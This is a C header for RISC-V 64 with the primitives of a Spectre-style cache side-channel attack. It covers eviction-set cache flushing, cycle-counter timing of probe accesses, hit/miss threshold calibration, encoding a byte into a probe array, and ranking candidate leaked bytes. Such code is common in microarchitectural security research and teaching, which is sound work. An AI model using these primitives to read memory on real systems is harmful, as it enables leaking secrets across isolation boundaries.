#ifndef RV64_SPECTRE_H
#define RV64_SPECTRE_H

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>

#define L1_BLOCK_SZ_BYTES 64u
#define L1_BLOCK_BITS 6u
#define L1_SETS 64u
#define L1_WAYS 4u
#define L1_SET_SPAN_BYTES (L1_SETS * L1_BLOCK_SZ_BYTES)
#define L1_SZ_BYTES (L1_SETS * L1_WAYS * L1_BLOCK_SZ_BYTES)

#ifndef PROBE_ENTRIES
#define PROBE_ENTRIES 256u
#endif

#ifndef EVICTION_MULTIPLIER
#define EVICTION_MULTIPLIER 4u
#endif

#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
#define PROBE_BYTES (PROBE_ENTRIES * PROBE_STRIDE)
#define EVICTION_BYTES (5u * L1_SZ_BYTES)

#ifndef SPECTRE_MAX_BYTES
#define SPECTRE_MAX_BYTES 0u
#endif

static uint8_t *rv64_eviction_mem;
static volatile uint8_t rv64_sink;

static inline void *spectre_alloc_aligned(size_t size, size_t alignment)
{
  const uintptr_t raw = (uintptr_t)malloc(size + alignment - 1u);
  if (raw == 0u)
    return NULL;
  return (void *)((raw + alignment - 1u) & ~(uintptr_t)(alignment - 1u));
}

static inline int spectre_runtime_init(void)
{
  if (rv64_eviction_mem != NULL)
    return 0;

  rv64_eviction_mem = (uint8_t *)spectre_alloc_aligned(EVICTION_BYTES, L1_SET_SPAN_BYTES);
  return rv64_eviction_mem == NULL ? -1 : 0;
}

static inline uint64_t rdcycle(void)
{
  uint64_t value;
  asm volatile("csrr %0, cycle" : "=r"(value));
  return value;
}

static inline void fence_all(void)
{
  asm volatile("fence rw, rw" ::: "memory");
}

static inline void delay_nops(unsigned int count)
{
  for (unsigned int i = 0; i < count; ++i)
    asm volatile("nop");
}

static inline uintptr_t eviction_base(void)
{
  if (rv64_eviction_mem == NULL && spectre_runtime_init() != 0)
    return 0u;

  return ((uintptr_t)rv64_eviction_mem + (L1_SET_SPAN_BYTES - 1u)) &
         ~(uintptr_t)(L1_SET_SPAN_BYTES - 1u);
}

static inline void flush_line(const void *addr)
{
  const uintptr_t line = ((uintptr_t)addr) >> L1_BLOCK_BITS;
  const uintptr_t set = line & (L1_SETS - 1u);
  const uintptr_t base = eviction_base();

  if (base == 0u)
    return;

  for (unsigned int way = 0; way < EVICTION_MULTIPLIER * L1_WAYS; ++way)
  {
    const uintptr_t p = base + (set << L1_BLOCK_BITS) +
                        ((uintptr_t)way * L1_SET_SPAN_BYTES);
    rv64_sink ^= *(volatile uint8_t *)p;
  }

  fence_all();
}

static inline void flush_range(const void *addr, size_t size)
{
  const uint8_t *p = (const uint8_t *)addr;
  const size_t lines = (size + L1_BLOCK_SZ_BYTES - 1u) / L1_BLOCK_SZ_BYTES;

  for (size_t i = 0; i < lines; ++i)
    flush_line(p + i * L1_BLOCK_SZ_BYTES);
}

static inline void probe_init(uint8_t *probe)
{
  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    probe[i * PROBE_STRIDE] = 1;
}

static inline size_t probe_mix(size_t i)
{
  return ((i * 167u) + 13u) % PROBE_ENTRIES;
}

static inline uint64_t probe_time(volatile uint8_t *addr)
{
  fence_all();
  const uint64_t start = rdcycle();
  const uint8_t value = *addr;
  fence_all();
  const uint64_t elapsed = rdcycle() - start;
  rv64_sink ^= value;
  return elapsed;
}

static inline uint64_t calibrate_probe_threshold(uint8_t *probe)
{
  volatile uint8_t *hot = &probe[0];
  volatile uint8_t *cold = &probe[PROBE_STRIDE];

  *hot = 1;
  flush_line((const void *)cold);
  const uint64_t hit = probe_time(hot);
  flush_line((const void *)cold);
  const uint64_t miss = probe_time(cold);

  return (hit + miss) / 2u;
}

static inline void probe_encode(uint8_t *probe, uint8_t value)
{
#if PROBE_ENTRIES < 256u
  if ((size_t)value >= PROBE_ENTRIES)
    return;
#endif
  rv64_sink ^= probe[(size_t)value * PROBE_STRIDE];
}

static inline size_t spectre_limit_len(size_t len)
{
#if SPECTRE_MAX_BYTES > 0
  return len < (size_t)SPECTRE_MAX_BYTES ? len : (size_t)SPECTRE_MAX_BYTES;
#else
  return len;
#endif
}

static inline void top_two_idx(const uint64_t *scores, size_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (size_t i = 0; i < count; ++i)
  {
    if (scores[i] > out_score[0])
    {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = scores[i];
      out_idx[0] = (uint8_t)i;
    }
    else if (scores[i] > out_score[1])
    {
      out_score[1] = scores[i];
      out_idx[1] = (uint8_t)i;
    }
  }
}

#endif
